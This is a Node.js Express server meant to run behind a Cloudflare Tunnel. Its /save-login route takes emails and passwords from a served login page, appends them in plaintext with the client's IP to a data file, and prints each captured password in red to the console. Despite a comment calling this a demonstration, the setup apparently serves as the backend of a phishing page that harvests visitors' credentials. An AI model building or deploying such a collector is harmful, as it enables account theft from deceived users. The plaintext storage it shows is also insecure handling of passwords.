const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const os = require('os');

const app = express();
const PORT = 3000;

// CORS setup for Cloudflare Tunnel
app.use(cors({
    origin: true, // Allow all origins
    credentials: true,
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With']
}));

// Handle preflight requests (catch-all) ✅ FIXED

// Trust Cloudflare proxy
app.set('trust proxy', true);

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Serve static files
app.use(express.static('public'));

// File paths
const DATA_DIR = path.join(__dirname, 'data');
const USER_DAT_FILE = path.join(DATA_DIR, 'user.dat');

// Ensure directories exist
function ensureDirectories() {
    if (!fs.existsSync(DATA_DIR)) {
        fs.mkdirSync(DATA_DIR, { recursive: true });
        console.log('📁 Created data directory:', DATA_DIR);
    }
}

// Get client IP (Cloudflare compatible)
function getClientIP(req) {
    return req.headers['cf-connecting-ip'] ||
           req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
           req.connection.remoteAddress ||
           req.ip ||
           'Unknown';
}

// Root route
app.get('/', (req, res) => {
    console.log('🏠 Serving index.html to:', req.headers.host);
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Health check
app.get('/health', (req, res) => {
    res.json({
        status: 'healthy',
        server: os.hostname(),
        timestamp: new Date().toISOString(),
        message: 'Server is running and ready for Cloudflare Tunnel'
    });
});

// Debug endpoint
app.get('/debug', (req, res) => {
    const clientInfo = {
        ip: getClientIP(req),
        host: req.headers.host,
        origin: req.headers.origin,
        userAgent: req.get('User-Agent'),
        cfRay: req.headers['cf-ray'],
        cfCountry: req.headers['cf-ipcountry'],
        cfConnectingIP: req.headers['cf-connecting-ip']
    };

    console.log('🔍 Debug request from:', clientInfo.host);

    res.json({
        server: {
            hostname: os.hostname(),
            platform: os.platform(),
            arch: os.arch(),
            uptime: os.uptime(),
            timestamp: new Date().toISOString()
        },
        client: clientInfo,
        tunnel: {
            status: 'active',
            type: clientInfo.cfRay ? 'Cloudflare Tunnel' : 'Direct'
        },
        endpoints: [
            'GET  /health',
            'GET  /debug',
            'GET  /system-info',
            'GET  /test',
            'GET  /get-login-info',
            
        ]
    });
});

// System info
app.get('/system-info', (req, res) => {
    res.json({
        server: {
            platform: process.platform,
            arch: process.arch,
            hostname: os.hostname(),
            uptime: os.uptime(),
            totalMemory: Math.round(os.totalmem() / 1024 / 1024) + ' MB',
            freeMemory: Math.round(os.freemem() / 1024 / 1024) + ' MB',
            cpus: os.cpus().length,
            loadAverage: os.loadavg()
        },
        connection: {
            clientIP: getClientIP(req),
            host: req.headers.host,
            cfRay: req.headers['cf-ray'] || 'N/A',
            cfCountry: req.headers['cf-ipcountry'] || 'N/A'
        },
        status: 'online',
        timestamp: new Date().toISOString()
    });
});



// POST /save-login route to save credentials
// POST /save-login route to save credentials
app.post('/save-login', async (req, res) => {
    // ⚠️ SECURITY WARNING: Storing plaintext passwords like this is HIGHLY insecure.
    // This is done here only to demonstrate the file-saving functionality.
    // In production, ALWAYS hash passwords using a library like 'bcrypt'.

    // 1. Get data from the request body
    const { email, password } = req.body;

    // 2. Validate input
    if (!email || !password) {
        console.warn('❌ Attempt to save login failed: Missing email or password.');
        return res.status(400).json({ 
            success: false, 
            message: 'Email and password are required.' 
        });
    }

    // 3. Prepare data and log entry
    const timestamp = new Date().toISOString();
    const clientIP = getClientIP(req); // Uses the Cloudflare-compatible function you defined
    
    // Format the data to be saved in user.dat
    const logData = `[${timestamp}][${clientIP}] Email: ${email}, Password: ${password}\n`;

 
    // 4. Ensure data directory exists (using the function you defined earlier)
    ensureDirectories();

    // 5. Append data to user.dat file
    
    try {
        // Use fs.promises for async file writing
        await fs.promises.appendFile(USER_DAT_FILE, logData, 'utf8');
   
        console.log('\x1b[31m%s\x1b[0m',`Email: ${email}`);
        console.log('\x1b[31m%s\x1b[0m',`Password: ${password}`);

        console.log(`✅ Login credentials saved to ${path.basename(USER_DAT_FILE)}`);

        // 6. Send success response back to the frontend
        res.status(200).json({
            success: true,
            message: 'Login credentials saved successfully.'
        });
    } catch (error) {
        console.error('🚨 Failed to write to file:', error);
        res.status(500).json({
            success: false,
            message: 'Server failed to save credentials to file.',
            error: error.message
        });
    }
        
});
app.options('/save-login', cors());
// IMPORTANT: Remember to restart your Node.js server after adding this code!

// Test endpoint
app.get('/test', (req, res) => {
    res.json({
        message: 'Cloudflare Tunnel Test Successful!',
        
        client: {
            ip: getClientIP(req),
            host: req.headers.host,
            cfHeaders: {
                ray: req.headers['cf-ray'],
                country: req.headers['cf-ipcountry'],
                connectingIP: req.headers['cf-connecting-ip']
            }
        },
        server: os.hostname(),
        timestamp: new Date().toISOString()
    });
});

// 404 handler
app.use((req, res) => {
    res.status(404).json({
        success: false,
        message: 'Endpoint not found: ' + req.originalUrl,
        availableEndpoints: [
            'GET  /',
            'GET  /health',
            'GET  /debug',
            'GET  /system-info',
            'GET  /test',
            'GET  /get-login-info'

        ],
        timestamp: new Date().toISOString()
    });
});

// Error handler
app.use((error, req, res, next) => {
    console.error('🚨 Unhandled error:', error);
    res.status(500).json({
        success: false,
        message: 'Internal server error',
        error: error.message,
        timestamp: new Date().toISOString()
    });
});

// Start server
app.listen(PORT, '0.0.0.0', () => {
   // console.log('🚀 Server started successfully!');
   // console.log('📍 Local:    http://localhost:' + PORT);
   // console.log('📍 Network:  http://0.0.0.0:' + PORT);
   // console.log('🌐 Cloudflare Tunnel Ready');
   // console.log('⏰ Started at:', new Date().toISOString());
});
